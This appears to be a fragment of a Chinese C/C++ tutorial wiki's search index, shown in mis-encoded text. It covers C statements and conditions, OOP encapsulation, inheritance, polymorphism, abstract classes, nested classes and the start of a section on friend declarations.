x&gt;y?2:3; å…ˆæŠŠecxæ¸…é›¶ã€‚ç„¶åæ¯”è¾ƒ[ebp-4]å’Œ[ebp-8] å¦‚æœ[ebp-4]&gt;[ebp-8]ï¼Œclå°±ä¼šç½®0ï¼Œç„¶å+2ï¼Œèµ‹å€¼ç»™å±€éƒ¨å˜é‡z; å¦‚æœ[ebp-4]&lt;=[ebp-8]ï¼Œclå°±ä¼šç½®1ï¼Œç„¶å+2ï¼Œèµ‹å€¼ç»™å±€éƒ¨å˜é‡z; ç¼–è¯‘å™¨ä¼šæ ¹æ®å€¼çš„ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œè¿™ä¸ªä¾‹å­å¹¶ä¸æ˜¯è¯´æ¡ä»¶è¿ç®—ç¬¦çš„æ±‡ç¼–éƒ½æ˜¯è¿™æ ·ã€‚é€†å‘çœ‹å¤šäº†ï¼Œèƒ½çœ‹å‡ºæ¥æ˜¯ç”¨çš„ä¸‰ç›®è¿ç®—ç¬¦ã€‚ ä½†æ²¡å¿…è¦è¿˜åŸæˆå¼€å‘è€…å½“æ—¶ä¸€æ¨¡ä¸€æ ·çš„cè¯­è¨€å†™æ³•ï¼Œé€»è¾‘åŠŸèƒ½ä¸€æ ·å³å¯ï¼Œé€†å‘çœ‹åˆ°ä¸Šé¢çš„åæ±‡ç¼–ï¼Œç”¨ifâ€¦elseè¿˜åŸä¹Ÿå¯ä»¥ã€‚ ä¼˜å…ˆçº§ é€šè¿‡()æ”¹å˜ä¼˜å…ˆçº§ è¯­å¥ å®šä¹‰ è¯­å¥ï¼Œæµ·å“¥çš„å®šä¹‰ï¼šåªæœ‰å¯¹å†…å­˜äº§ç”Ÿå½±å“ï¼Œæ¯”å¦‚ä¿®æ”¹æˆ–åˆ†é…çš„æ‰å«è¯­å¥ã€‚ä¸‹é¢è¿™å¥x+y+1;å°±ä¸ç®—æ˜¯è¯­å¥ï¼Œå³ä½¿å®ƒåŠ äº†; 1234567void main()&#123; int x=10; int y=20; x+y+1;&#125; æµç¨‹æ§åˆ¶è¯­å¥ï¼Œifâ€¦elseâ€¦æ•´ä½“æ˜¯ä¸€ä¸ªè¯­å¥ 12345678if()&#123;&#125;else&#123;&#125; æ‰§è¡Œæ¡ä»¶ è¡¨è¾¾å¼çš„ç»“æœä¼šè½¬æ¢ä¸ºå¸ƒå°”å€¼ï¼Œ0ä¸ºå‡ï¼Œé0ä¸ºçœŸã€‚ èµ‹å€¼è¡¨è¾¾å¼çš„ç»“æœæ˜¯èµ‹å€¼çš„å€¼ï¼Œåœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­x=2è¿™ä¸ªè¡¨è¾¾å¼ç»“æœå°±æ˜¯2ï¼Œä¸ºçœŸï¼Œæ‰€ä»¥æ‰§è¡Œ 123456789101112131415161718192021222324252627int main()&#123; int x; if(1) //æ‰§è¡Œ &#123; printf(&quot;1 &quot;); &#125; if(2) //æ‰§è¡Œ &#123; printf(&quot;2 &quot;); &#125; if(-1) //é0ä¸ºçœŸï¼Œæ‰§è¡Œ &#123; printf(&quot;3 &quot;); &#125; if(0) //ä¸æ‰§è¡Œ &#123; printf(&quot;4 &quot;); &#125; if(x=2) //æ‰§è¡Œ &#123; //èµ‹å€¼è¡¨è¾¾å¼ï¼Œå®ƒçš„ç»“æœæ˜¯èµ‹å€¼çš„å€¼ï¼Œå³2 printf(&quot;5 &quot;); &#125; return 0;&#125; èµ‹å€¼è¯­å¥çš„æœ¬è´¨ æœ¬è´¨ï¼šå°†æŸä¸ªå€¼å­˜å‚¨åˆ°å˜é‡ä¸­çš„è¿‡ç¨‹å°±æ˜¯èµ‹å€¼ã€‚ ä»¥ä¸‹å½¢å¼å‡æ˜¯èµ‹å€¼è¯­å¥ï¼Œæ²¡æœ‰æœ¬è´¨åŒºåˆ« 123456789101112131415161718192021#include &lt;stdio.h&gt;int Add(int x, int y)&#123; return x + y;&#125;int main()&#123; int x = 10; int y = x + 10; int z = x * y; int k = (x + y) * z; int m = Add(x, y); return 0;&#125;"},{"title":"OOPä¸‰å¤§ç‰¹å¾","path":"/wiki/C++/OOPä¸‰å¤§ç‰¹å¾.html","content":"å‰è¨€ ç‰©ä»¶å°å‘ç¨‹å¼è¨­è¨ˆï¼ˆè‹±èªï¼šObject-oriented programmingï¼Œç¼©å†™ï¼šOOPï¼‰ï¼Œå›½å†…ç¿»è¯‘æ˜¯é¢å‘å¯¹è±¡ å‰é¢è®²è¿‡äº†ç»§æ‰¿ï¼Œå°è£…ï¼Œå¤šæ€çš„è¯­æ³•è¦æ±‚ï¼Œæœ¬å°èŠ‚è®²ä¸‹è®¾è®¡å±‚é¢çš„å†…å®¹ã€‚ è¯­æ³•è¦æ±‚ï¼šå†™é”™å°±ç¼–è¯‘ä¸è¿‡å»ï¼Œæ–°æ‰‹å¾ˆå¿«å°±èƒ½å­¦ä¼š è®¾è®¡å±‚é¢ï¼šè¦æœ‰å¤§é‡codingç»éªŒæ‰èƒ½ä½“ä¼šå’Œæå‡è®¾è®¡å±‚é¢çš„ç†å¿µ å°è£… ç›®çš„ï¼šå®ç°æ•°æ®éšè— ä¸ºä»€ä¹ˆè¦éšè—æ•°æ®æˆå‘˜ï¼Ÿæ ¹æœ¬ç›®çš„æ˜¯å¯æ§ ä¾‹ æˆå‘˜ä½œä¸ºpublicï¼Œè¯­æ³•ä¸Šæ˜¯åˆæ³•çš„ï¼Œä½†ä¼šä¸å¯æ§ï¼Œå¯èƒ½ä¼šå‡ºç°Age=-1ï¼Œå‡ºç°ä¸åˆç†çš„ç°è±¡ è¯­æ³•okä½†è®¾è®¡ä¸å¥½å¯æ§123456789101112131415class Person&#123;public: int age; int sex;&#125;;int main()&#123; Person p; p.age = -1; // è¯­æ³•ä¸Šåˆæ³•ï¼Œä½†é€»è¾‘ä¸Šä¸åˆç†ï¼Œå¹´é¾„ä¸å¯èƒ½ä¸ºè´Ÿ p.sex = 2; return 0;&#125;é€šè¿‡publicçš„æ¥å£è®¿é—®ç§æœ‰æˆå‘˜ï¼Œåœ¨æ¥å£ä¸­åšåˆ°å¯¹æ•°æ®çš„å¯æ§ 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;class Person&#123;private: int age; int sex;public: void SetAge(int age) //é€šè¿‡publicçš„æ¥å£æ¥è®¿é—®ç§æœ‰æˆå‘˜ &#123; if(age&lt;0) //è¾¾åˆ°å¯æ§çš„ç›®çš„ &#123; printf(&quot;invalid_argument &quot;); &#125; else &#123; this-&gt;age=age; &#125; &#125;&#125;;int main()&#123; Person p; p.SetAge(2); return 0;&#125; ç»§æ‰¿ ç»§æ‰¿ï¼šå­ç±»ä»çˆ¶ç±»ç»§æ‰¿æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•° å¥½å¤„ï¼šä¸ç”¨é‡å¤é€ è½®å­ï¼Œç›¸åŒçš„ä»£ç ä¸ç”¨å†™ä¸¤é å¤šæ€ è®²å¤šæ€å¿…é¡»å…ˆä»OOPè¯­è¨€è®¾è®¡æ€æƒ³ä¸Šè¯´èµ·ã€‚OOPè¯­è¨€å‘æ˜æ—¶çš„è®¾è®¡æ€æƒ³ä¹‹ä¸€æ˜¯å‡å°‘é‡å¤ä»£ç çš„ç¼–å†™ï¼Œæœ¯è¯­å«æé«˜ä»£ç å¤ç”¨ã€‚ä»£ç å¤ç”¨æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯å‰è¾¹çš„ç»§æ‰¿ï¼ŒDerivedç±»é€šè¿‡ç»§æ‰¿ï¼Œç»§æ‰¿äº†Baseç±»çš„æ•°æ®ï¼ˆå˜é‡å’Œå‡½æ•°ï¼‰ï¼Œæ¥è¾¾åˆ°å‡å°‘ç›¸åŒä»£ç çš„ç¼–å†™ã€‚è¿˜æœ‰ä¸€ç§æ˜¯å…±ç”¨ç›¸åŒçš„å‡½æ•°ï¼Œæ¥çœ‹ä¸€ä¸ªä¾‹å­ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125; void Print() &#123; printf(&quot;%d %d &quot;, this-&gt;x, this-&gt;y); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; Derived(int x, int y, int z) : Base(x, y) &#123; this-&gt;z = z; &#125; void Print() //override &#123; Base::Print(); //ä»£ç å¤ç”¨ï¼ŒBaseç±»å†™è¿‡äº†ï¼Œè°ƒç”¨ï¼Œè€Œä¸å†å†™ä¸€æ¬¡ printf(&quot;%d &quot;, this-&gt;z); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;void PrintDerived(Derived&amp; d)&#123; d.Print();&#125;int main()&#123; Base b(1, 2); PrintBase(b); Derived d(1, 2, 3); PrintDerived(d); return 0;&#125; PrintBaseå‡½æ•°ï¼šç”¨äºæ‰“å°Baseç±»å¯¹è±¡çš„æˆå‘˜ PrintDerivedå‡½æ•°ï¼šç”¨äºæ‰“å°Derviredç±»å¯¹è±¡çš„æˆå‘˜ PrintBaseå‡½æ•°å’ŒPrintDerivedå‡½æ•°çœ‹ç€å°±åƒæ˜¯ç›¸åŒçš„è½®å­ï¼Œä¹Ÿæ˜¯é‡å¤ä»£ç ã€‚ 1234void PrintBase(Base&amp; b)&#123; b.Print();&#125; 1234void PrintDerived(Derived&amp; d)&#123; d.Print();&#125; å¦‚ä½•åˆå¹¶ï¼Ÿæ¥å‡å°‘ç›¸åŒä»£ç çš„é‡å¤ç¼–å†™ã€‚C++æœ‰upcastingï¼Œä¸€ä¸ªDerivedç±»å¯¹è±¡çš„æŒ‡é’ˆ/å¼•ç”¨å¯ä»¥äº¤ç»™Baseç±»å‹çš„æŒ‡é’ˆ/å¼•ç”¨ã€‚ä»å†…å­˜å¸ƒå±€ä¸Šæ¥è¯´ï¼Œè¿™æ˜¯å®‰å…¨çš„ï¼š çˆ¶ç±»æˆå‘˜åœ¨å­ç±»æˆå‘˜å‰é¢ å­ç±»æˆå‘˜æ˜¯çˆ¶ç±»æˆå‘˜çš„è¶…é›†ï¼Œçˆ¶ç±»æŒ‡é’ˆ/å¼•ç”¨è®¿é—®ä¸ä¼šè®¿é—®è¶Šç•Œ äºæ˜¯ä¸Šé¢ä»£ç å˜æˆï¼š 1234567891011121314151617void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b(1, 2); PrintBase(b); printf(&quot; &quot;); Derived d(1, 2, 3); PrintBase(d); //upcasting return 0;&#125; ä½†é—®é¢˜æ¥äº†ï¼Œä¼ Derivedç±»å¯¹è±¡æ—¶è°ƒç”¨çš„ä»æ˜¯Baseç±»çš„Printå‡½æ•°ï¼Œè€Œä¸æ˜¯Derivedç±»çš„Printã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒPrintBase()å‡½æ•°æ¥æ”¶å¯¹è±¡åï¼Œè°ƒç”¨çš„éƒ½æ˜¯Base::Printå‡½æ•°ï¼Œè€Œä¸æ˜¯ä¼šæ ¹æ®å¯¹è±¡ç±»å‹åŠ¨æ€å˜åŒ–ï¼š ä¼ Baseå¯¹è±¡ï¼Œè°ƒç”¨Baseçš„Print ä¼ Derivedå¯¹è±¡ï¼Œè°ƒç”¨Derivedçš„Print è¦æƒ³å®ç°çš„è¯ï¼Œéœ€è¦åœ¨Baseç±»ä¸­çš„Printå‡½æ•°å‰åŠ ä¸Švirtualå…³é”®å­— 12345678910111213141516171819class Base&#123;private: int x; int y;public: Base() &#123;&#125; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;- void Print()+ virtual void Print() &#123; printf(&quot;%d %d &quot;, this-&gt;x, this-&gt;y); &#125;&#125;; å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125; virtual void Print() &#123; printf(&quot;%d %d &quot;, this-&gt;x, this-&gt;y); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; Derived(int x, int y, int z) : Base(x, y) &#123; this-&gt;z = z; &#125; void Print() //override &#123; Base::Print(); //ä»£ç å¤ç”¨ï¼ŒBaseç±»å†™è¿‡äº†ï¼Œè°ƒç”¨ï¼Œè€Œä¸å†å†™ä¸€æ¬¡ printf(&quot;%d &quot;, this-&gt;z); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b(1, 2); PrintBase(b); printf(&quot; &quot;); Derived d(1, 2, 3); PrintBase(d); //upcasting return 0;&#125; åˆ°è¿™é‡Œå°±å¯ä»¥å¼•å‡ºå¤šæ€çš„æ¦‚å¿µäº† å¤šæ€æ˜¯OOPè¯­è¨€ä¸‰å¤§ç‰¹æ€§ä¹‹ä¸€ã€‚å¤šæ€ï¼šç›¸åŒçš„æ¥å£ï¼Œä¼šæ ¹æ®ä¼ å…¥å¯¹è±¡çš„å…·ä½“ç±»å‹è€Œäº§ç”Ÿä¸åŒçš„è¡Œä¸ºã€‚C++é€šè¿‡è™šå‡½æ•°æ¥å®ç°å¤šæ€ã€‚ ç›¸åŒçš„æ¥å£ï¼šåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒDerivedçš„æ‰“å°å‡½æ•°ä¹Ÿè¦æ˜¯void Print()ï¼Œè¦å’ŒBaseç±»æ‰“å°å‡½æ•°ä¸€æ ·ï¼Œå› ä¸ºè¦ç»Ÿä¸€çš„æ¥å£ PrintBase()å‡½æ•°ï¼Œé€šè¿‡çˆ¶ç±»çš„å¼•ç”¨ï¼Œæ ¹æ®ä¼ å…¥å¯¹è±¡çš„å…·ä½“ç±»å‹è€Œè¡¨ç°é‚£ä¸ªå¯¹è±¡çš„è¡Œä¸ºã€‚ æœªåŠ virtualå…³é”®å­—ï¼Œæ˜¯æ™®é€šçš„æˆå‘˜å‡½æ•°ï¼Œæ—©ç»‘å®šï¼ˆearly bindingï¼‰ï¼›åŠ virtualåï¼Œè¡¨ç¤ºæ˜¯è™šå‡½æ•°ï¼Œæ™šç»‘å®šï¼ˆlate bindingï¼‰ å…³äºè™šå‡½æ•°çš„åº•å±‚å®ç°ï¼Œåé¢çš„æ–‡ç« è®² ç›¸å…³æ¦‚å¿µ çº¯è™šå‡½æ•° å¦‚æœBaseç±»çš„è™šå‡½æ•°æ²¡æœ‰å…·ä½“å®ç°çš„æ„ä¹‰ï¼Œåªæ˜¯ä¸ºäº†ç»™å­ç±»å®šä¹‰ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ï¼Œé‚£ä¹ˆå¯ä»¥å®šä¹‰æˆçº¯è™šå‡½æ•°ï¼ˆpure virtual functionï¼‰ã€‚ è¯­æ³•æ ¼å¼ å°†æˆå‘˜å‡½æ•°å£°æ˜ä¸ºvirtual è¯¥å‡½æ•°æ²¡æœ‰å‡½æ•°ä½“ï¼ˆåè·Ÿ=0ï¼‰ è¯­æ³•æ ¼å¼1virtual &lt;è¿”å›ç±»å‹&gt; &lt;å‡½æ•°å&gt;(å‚æ•°åˆ—è¡¨) = 0; å¥½å¤„ï¼šå­ç±»å¿…é¡»é‡å†™è¿™ä¸ªè™šå‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šå¸®å¿™æ£€æŸ¥ è™šå‡½æ•°å¯ä»¥è¢«ç›´æ¥è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«å­ç±»é‡å†™åä»¥å¤šæ€çš„å½¢å¼è°ƒç”¨ çº¯è™šå‡½æ•°å¿…é¡»åœ¨å­ç±»ä¸­å®ç°è¯¥å‡½æ•°æ‰å¯ä»¥ä½¿ç”¨ æŠ½è±¡ç±» å«æœ‰çº¯è™šå‡½æ•°çš„ç±»è¢«ç§°ä¸ºæŠ½è±¡ç±»ï¼ˆabstract classï¼‰ æŠ½è±¡ç±»ä¸­ä¹Ÿå¯ä»¥åŒ…å«æ™®é€šçš„å‡½æ•° æŠ½è±¡ç±»ä¸èƒ½å®ä¾‹åŒ–ï¼ˆåˆ›å»ºå¯¹è±¡ï¼‰ï¼Œ çº¯è™šå‡½æ•°å’ŒæŠ½è±¡ç±»çš„è¯­æ³•å¾ˆç®€å•ï¼Œå‡ å¥è¯å°±è¯´å®Œäº†ï¼Œä½†æˆ‘ä»¬éœ€è¦ç«™åœ¨æ›´é«˜çš„è§’åº¦å»ç†è§£ æŠ½è±¡ç±»çš„æ„ä¹‰ æŠ½è±¡ç±»ä¸ºå­ç±»å®šä¹‰æ ‡å‡†ï¼Œå®šä¹‰è§„èŒƒï¼Œå…·ä½“å®ç°ç”±å­ç±»å®ç°ã€‚å¥½å¤„ï¼šç”±äºå­ç±»æ‹¥æœ‰å…±åŒçš„æ ‡å‡†ï¼Œè§„èŒƒï¼Œè¡Œä¸ºï¼Œå°±ä¾¿äºç®¡ç†å’Œç»Ÿè®¡ã€‚ æ¯”å¦‚ï¼Œæ·˜å®ï¼Œæœ‰å¾ˆå¤šåº—é“ºï¼Œè™½ç„¶æ¯ä¸ªåº—é“ºå–çš„ä¸œè¥¿éƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯ä»–ä»¬åŒæ ·å…·æœ‰å•†å“å±•ç¤ºã€ä¸‹å•ã€è¯„è®ºã€è´­ç‰©è½¦ç­‰åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´ä»–ä»¬éƒ½éµå®ˆäº†ç›¸åŒçš„æ ‡å‡†å’Œè§„åˆ™ï¼›å…·ä½“çš„å®ç°äº¤ç»™å¼€æ·˜å®åº—çš„äººï¼ˆå­ç±»ï¼‰å»æ ¹æ®è‡ªå·±çš„æƒ…å†µæ¥å®ç°ã€‚ ä¾‹ æŠ½è±¡ç±»CBankå®šä¹‰äº†ä¸€ä¸ªçº¯è™šå‡½æ•°ï¼Œè¯¥è™šå‡½æ•°åŠŸèƒ½æ˜¯è¿”å›å¹´åˆ©ç‡ã€‚CICBBankå’ŒCCCBankç»§æ‰¿äº†CBankç±»å¹¶å®ç°äº†è™šå‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;windows.h&gt;//æŠ½è±¡ç±»ï¼šæŠ½è±¡ç±»çœ‹æˆæ˜¯ä¸€ä¸ªæ ‡å‡†ï¼Œä»»ä½•è¯¥ç±»çš„å­ç±»éƒ½å¿…é¡»éµå®ˆçš„æ ‡å‡†class CBank&#123;public: virtual double GetAnnualRate() = 0; // pure virturl function&#125;;//ä¸­å›½å·¥å•†é“¶è¡Œclass CICBBank : public CBank&#123;private: double m_dPrincipal;public: CICBBank(double dPrincipal) //å­˜å…¥çš„æœ¬é‡‘ &#123; m_dPrincipal = dPrincipal; &#125; double GetAnnualRate() //å¹´åˆ©ç‡ &#123; return 0.1; &#125; double GetTotalMoney() //ç›®å‰æ€»èµ„äº§ï¼šæœ¬é‡‘+æœ¬é‡‘*å¹´åˆ©æ¶¦ &#123; return m_dPrincipal + m_dPrincipal * GetAnnualRate(); &#125;&#125;;//ä¸­å›½å»ºè®¾é“¶è¡Œclass CCCBank : public CBank&#123;private: double m_dPrincipal;public: CCCBank(double dPrincipal) &#123; m_dPrincipal = dPrincipal; &#125; double GetAnnualRate() &#123; return 0.2; &#125; double GetTotalMoney() &#123; return m_dPrincipal + m_dPrincipal * GetAnnualRate(); &#125;&#125;;void ShowAnnualRate(CBank* pBank[],DWORD nLength) //ç»Ÿè®¡æ‰€æœ‰é“¶è¡Œçš„åˆ©ç‡&#123; for(int i=0;i&lt;nLength;i++) &#123; printf(&quot;%2lf &quot;,pBank[i]-&gt;GetAnnualRate()); &#125;&#125;int main()&#123; CICBBank icbc(10000); double dMoney1=icbc.GetTotalMoney(); CICBBank ccb(10000); double dMoney2=ccb.GetTotalMoney(); CBank* pBank[]=&#123;&amp;icbc,&amp;ccb&#125;; ShowAnnualRate(pBank,2); return 0;&#125; å³ä½¿CICBBankå’ŒCCCBankä¸ç»§æ‰¿CBankç±»ï¼Œä¹Ÿèƒ½å®Œæˆå„è‡ªå®Œæˆæ€»èµ„äº§ï¼šæœ¬é‡‘+æœ¬é‡‘*å¹´åˆ©æ¶¦çš„åŠŸèƒ½ã€‚ä½†å®ƒä»¬æœ‰äº†ç»Ÿä¸€çš„æŠ½è±¡ç±»åï¼Œå½“æˆ‘ä»¬éœ€è¦ç»Ÿè®¡ç®¡ç†æ—¶å°±å¾ˆæ–¹ä¾¿ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ˜¯ä»CBankç±»æ´¾ç”Ÿï¼Œå½“éœ€è¦ç»Ÿè®¡å„é“¶è¡Œçš„å¹´åˆ©ç‡æ—¶å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç»Ÿè®¡å‡ºï¼š 1234567891011121314151617void ShowAnnualRate(CBank* pBank[],DWORD nLength) //ç»Ÿè®¡æ‰€æœ‰é“¶è¡Œçš„åˆ©ç‡&#123; for(int i=0;i&lt;nLength;i++) &#123; printf(&quot;%2lf &quot;,pBank[i]-&gt;GetAnnualRate()); &#125;&#125;int main()&#123; //...... CBank* pBank[]=&#123;&amp;icbc,&amp;ccb&#125;; ShowAnnualRate(pBank,2); return 0;&#125;"},{"title":"å†…éƒ¨ç±»ï¼ˆåµŒå¥—ç±»ï¼‰","path":"/wiki/C++/å†…éƒ¨ç±»ï¼ˆåµŒå¥—ç±»ï¼‰.html","content":"å†…éƒ¨ç±»ï¼ˆä¹Ÿç§°ä¸ºåµŒå¥—ç±»ï¼‰ï¼šä¸€ä¸ªç±»å®šä¹‰åœ¨å¦ä¸€ä¸ªç±»çš„å†…éƒ¨ã€‚ è¯­æ³•æ ¼å¼ å†…éƒ¨ç±»ç›´æ¥åœ¨å¤–éƒ¨ç±»å†™å…¨å†…éƒ¨ç±»çš„å£°æ˜å’Œå®šä¹‰åˆ†å¼€123456789101112class OuterClass &#123;public: // å£°æ˜å†…éƒ¨ç±» class InnerClass &#123; public: void display() &#123;&#125; &#125;; &#125;;è¿˜å¯ä»¥è¿›ä¸€æ­¥å°†å‡½æ•°çš„å£°æ˜å’Œå®ç°åˆ†å¼€ 12345678910111213class OuterClass &#123;public: class InnerClass; // å£°æ˜å†…éƒ¨ç±»&#125;;// åœ¨å¤–éƒ¨ç±»å¤–éƒ¨å®šä¹‰å†…éƒ¨ç±»class OuterClass::InnerClass &#123;public: void display() &#123;&#125;&#125;;// Endå†…éƒ¨ç±» å¤–éƒ¨ç±»é™å®šäº†å†…éƒ¨ç±»ç±»åçš„ä½œç”¨åŸŸèŒƒå›´ï¼Œæ‰€ä»¥åœ¨å¤–éƒ¨ç±»ä»¥å¤–å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡éœ€è¦ä½¿ç”¨ç±»::å†…éƒ¨ç±» å¯¹è±¡å å¤§å° å†…éƒ¨ç±»çš„å­˜åœ¨ä¸ä¼šå½±å“å¤–éƒ¨ç±»çš„å¤§å°ã€‚ å¤–éƒ¨ç±»çš„å¤§å°å–å†³äºå…¶æˆå‘˜å˜é‡çš„å¤§å°å’Œæ•°é‡ï¼Œå¦‚æœå¤–éƒ¨ç±»çš„å®ä¾‹ä¸­åŒ…å«å†…éƒ¨ç±»çš„å¯¹è±¡ä½œä¸ºå…¶æˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆå¤–éƒ¨ç±»å¯¹è±¡çš„å¤§å°æ‰ä¼šå¢åŠ ã€‚ 123456789101112131415161718192021222324#include &lt;stdio.h&gt;class OuterClass &#123;private: int outerData;public: // å£°æ˜å†…éƒ¨ç±» class InnerClass &#123; private: int innerData; &#125;; // Endå†…éƒ¨ç±»&#125;;int main() &#123; printf(&quot;Size of OuterClass: %lu &quot;, sizeof(OuterClass)); //è¾“å‡ºæ˜¯4 return 0;&#125; å¤–éƒ¨ç±»å’Œå†…éƒ¨ç±»çš„å…³ç³» å†…éƒ¨ç±»å¯ä»¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆåŒ…æ‹¬ç§æœ‰æˆå‘˜ï¼‰ï¼Œå› ä¸ºå®ƒåœ¨å¤–éƒ¨ç±»çš„ä½œç”¨åŸŸå†…ã€‚ å¤–éƒ¨ç±»æ— æ³•ç›´æ¥è®¿é—®å†…éƒ¨ç±»çš„æˆå‘˜ã€‚è¦è®¿é—®è¿™äº›æˆå‘˜ï¼Œéœ€è¦é€šè¿‡å†…éƒ¨ç±»publicçš„æ¥å£ã€‚ å…¶å®å°±æ˜¯å†…éƒ¨ç±»æ˜¯å¤–éƒ¨ç±»çš„å‹å…ƒ å†…éƒ¨ç±»+è®¿é—®æ§åˆ¶è¯´æ˜ç¬¦ å†…éƒ¨ç±»å¯ä»¥å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„publicã€protectedæˆ–privateåŒºåŸŸã€‚ å¦‚æœå®šä¹‰åœ¨publicåŒºåŸŸï¼Œé‚£ä¹ˆå¤–éƒ¨çš„å…¶ä»–ç±»ä¹Ÿå¯ä»¥è®¿é—®åˆ°å†…éƒ¨ç±»ï¼Œè¦é€šè¿‡å¤–éƒ¨ç±»å::å†…éƒ¨ç±»åæ¥å®šä¹‰å†…éƒ¨ç±»çš„å¯¹è±¡ å¦‚æœå®šä¹‰åœ¨privateåŒºåŸŸï¼Œé‚£ä¹ˆåªæœ‰å¤–éƒ¨ç±»è‡ªå·±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå†…éƒ¨ç±»ï¼Œè¿™å¯¹äºéšè—å®ç°ç»†èŠ‚éå¸¸æœ‰ç”¨ã€‚ publicå†…éƒ¨ç±» privateå†…éƒ¨ç±» åœ¨å¤–éƒ¨ç±»ä¸­è®¿é—®å†…éƒ¨ç±» âˆš âˆš åœ¨å¤–éƒ¨ç±»ç±»å¤–é¢ï¼Œæ¯”å¦‚mainä¸­è®¿é—®å†…éƒ¨ç±» âˆš Ã— 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;class OuterClass &#123;public: //publicçš„å†…éƒ¨ç±» class PublicInnerClass &#123; public: void display() &#123; printf(&quot;Publicå†…éƒ¨ç±» &quot;); &#125; &#125;; // Endå†…éƒ¨ç±»private: //privateçš„å†…éƒ¨ç±» class PrivateInnerClass &#123; public: void display() &#123; printf(&quot;Privateå†…éƒ¨ç±» &quot;); &#125; &#125;; // Endå†…éƒ¨ç±»public: void usePrivateInner() &#123; PrivateInnerClass inner; inner.display(); // åœ¨OuterClasså†…éƒ¨ä½¿ç”¨privateçš„å†…éƒ¨ç±»,ok &#125;&#125;;int main() &#123; OuterClass::PublicInnerClass publicInner; //åœ¨OuterClassç±»å¤–éƒ¨è®¿é—®publicçš„å†…éƒ¨ç±»,ok publicInner.display(); // OuterClass::PrivateInnerClass privateInner; //åœ¨OuterClassç±»å¤–éƒ¨è®¿é—®privateçš„å†…éƒ¨ç±»,errorï¼Œç¼–è¯‘é”™è¯¯ return 0;&#125; å†…éƒ¨ç±»å­˜åœ¨çš„ç›®çš„ ç”¨äºå®ç°OOPçš„å°è£…ï¼Œå®ç°æ•°æ®éšè—ã€‚å½“ä¸€ä¸ªæ¨¡å—åªæœ‰è¿™ä¸ªç±»ä¼šç”¨åˆ°ï¼Œå°±æŠŠè¿™ä¸ªç±»å®šä¹‰æˆå†…éƒ¨ç±»ï¼Œç”šè‡³å¦‚æœåªæœ‰å¤–éƒ¨ç±»ä¸­çš„æŸä¸ªæˆå‘˜å‡½æ•°ä¼šç”¨åˆ°ï¼Œå¯ä»¥å°†å†…éƒ¨ç±»å®šä¹‰åœ¨è¿™ä¸ªæˆå‘˜å‡½æ•°ä¸­ã€‚ å†…éƒ¨ç±»è¿˜å¯ä»¥è®¿é—®å¤–éƒ¨ç±»çš„ç§æœ‰æˆå‘˜ï¼Œè¿™å¯¹äºå®ç°æŸäº›è®¾è®¡æ¨¡å¼ï¼ˆå¦‚Builderæˆ–Factoryæ¨¡å¼ï¼‰éå¸¸æœ‰ç”¨ã€‚ å°ç»“ å†…éƒ¨ç±»åªä¸è¿‡æ˜¯ä¸€ä¸ªå®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å®šä¹‰åŸŸä¸­çš„æ™®é€šç±»"},{"title":"å‹å…ƒ","path":"/wiki/C++/å‹å…ƒ.html","content":"å‰è¨€ å‰é¢è®²è¿‡OOPè®¾è®¡çš„è®¾è®¡æ€æƒ³ä¹‹ä¸€ï¼Œå°è£…ï¼Œé€šè¿‡è®¿é—®æ§åˆ¶ç¬¦å¯¹æ•°æ®è¿›è¡Œéšè—ï¼Œå¤–éƒ¨æƒ³è¦è®¿é—®è¿™äº›æ•°æ®éœ€è¦é€šè¿‡æ¥å£æ¥è®¿é—®ï¼Œé€šè¿‡æ¥å£å¼€å‘è€…å¯ä»¥è¾¾åˆ°å¯¹æ•°æ®çš„æ§åˆ¶ã€‚ä½†C++æœ‰ä¸€ç§æœºåˆ¶ï¼Œå‹å…ƒï¼ˆæœ‹å‹ å…ƒç´ ï¼‰ï¼Œç ´åäº†è¿™ç§å°è£…æ€§ã€‚æœ¬å°èŠ‚ç›®çš„åœ¨äºè¯´æ˜å‹å…ƒæ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æœªæ¥åœ¨å¼€å‘ä¸­ä¸å»ºè®®è¿›è¡Œä½¿ç”¨ã€‚ 